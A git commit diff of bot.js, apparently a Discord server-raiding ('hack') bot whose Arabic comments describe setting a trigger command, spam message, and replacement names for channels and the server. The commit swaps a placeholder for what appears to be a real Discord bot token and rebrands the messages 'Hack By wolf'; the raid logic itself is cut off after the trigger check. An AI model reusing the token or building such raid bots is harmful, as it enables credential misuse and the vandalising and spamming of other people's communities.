701a25ff716576e38f8c5e0d6c61be0240587473
wolfpro231 <48035876+wolfpro231@users.noreply.github.com>
2019-05-10 04:53:53 +0200

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,14 +1,14 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
 //انا لا اتحمل مسؤولية اي باند يجيك من سيرفر او من دسكورد نفسه
-const Token = "BOT_TOKEN" //هنا توكن البوت اللي بتشغل عليه الهاك
+const Token = "NTU0NDY5MDA2MTcwNjUyNjgx.XNTmQg.5uOQhxzG6YIF4ra5PAn1qP-KVa4" //هنا توكن البوت اللي بتشغل عليه الهاك
 const x_x = ".2" //هنا تحط الامر اللي يشغل الهاك
-const teext = "تمت الجحفلة By : - Mál" //هنا تحط وش تبي يكون اسم الرومات الكتابيه
-const vooice = "تمت الجحفلة By : - Mál" //هنا تحط وش تبي يكون اسم الرومات الصوتيه
+const teext = "Hack By wolf" //هنا تحط وش تبي يكون اسم الرومات الكتابيه
+const vooice = "Hack By wolf" //هنا تحط وش تبي يكون اسم الرومات الصوتيه
 const pic = "https://cdn.discordapp.com/avatars/200644160179535872/5a245f045a43665f00f6b1a7817cc68c.png?size=2048" //هنا تحط رابط الصوره اللي بيحطها البوت بكل مكان
-const spam = "تمت الجحفلة By : - Mál" //هنا تحط وش تبي رسالة السبام
-const namee = "تمت الجحفلة By : - Mál" //هنا تحط وش تبي اسم السيرفر واسم البوت والبلاينق
-const playing = "Hacked u hhh Malicious" //هنا تحط وش تبي يكون الستريمنق
+const spam = "Hack By wolf" //هنا تحط وش تبي رسالة السبام
+const namee = "Hack By wolf" //هنا تحط وش تبي اسم السيرفر واسم البوت والبلاينق
+const playing = "Hack By wolf" //هنا تحط وش تبي يكون الستريمنق
 client.on('message', message => {
 if (message.content === x_x) {
     var teeext = teext.replace(" ", "-")
